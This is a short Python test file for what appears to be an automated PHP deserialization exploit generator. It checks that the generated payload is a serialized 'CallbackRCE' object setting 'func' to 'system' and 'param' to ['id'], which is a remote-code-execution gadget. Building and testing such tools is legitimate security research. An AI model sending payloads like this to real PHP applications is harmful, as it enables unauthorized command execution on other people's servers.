import pytest
from core_v2.engine import Sd0pEngineV2

def test_callback_rce_e2e():
    engine = Sd0pEngineV2()
    
    with open('tests/fixtures/callback_rce_class.php', 'r') as f:
        code = f.read()
        
    payload = engine.analyze_and_generate(code)
    
    print(f"Generated Payload: {repr(payload)}")
    
    # 验证关键点
    assert "O:11:\"CallbackRCE\":2:{" in payload  # 2个属性，无 __wakeup
    assert "s:4:\"func\"" in payload              # func 属性存在
    assert "s:6:\"system\"" in payload            # func 值为 system
    assert "s:5:\"param\"" in payload             # param 属性存在
    assert "a:1:{i:0;s:2:\"id\";}" in payload     # param 值为数组 ["id"]
    
    print("✅ Callback RCE test passed!")

if __name__ == "__main__":
    test_callback_rce_e2e()
